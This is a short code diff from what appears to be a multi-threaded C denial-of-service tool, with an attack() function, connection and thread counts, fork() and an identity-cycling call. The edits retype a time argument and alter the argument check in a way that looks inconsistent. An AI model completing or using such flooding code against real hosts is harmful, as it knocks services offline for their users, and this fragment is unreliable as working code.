@@ -54,7 +54,7 @@ void broke(int s) {
 #define CONNECTIONS 8
 #define THREADS 48
 
-void attack(char *host, char *port, int timeEnd, int id) {
+void attack(char *host, char *port, char *timeEnd, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
 	for(x=0; x < CONNECTIONS; x++)
@@ -97,7 +97,7 @@ int main(int argc, char **argv) {
 	int x;
 	
 	
-	if(argc !=5)
+	if(argc !=4)
 		cycle_identity();
 	for(x=0; x != THREADS; x++) {
 		if(fork())
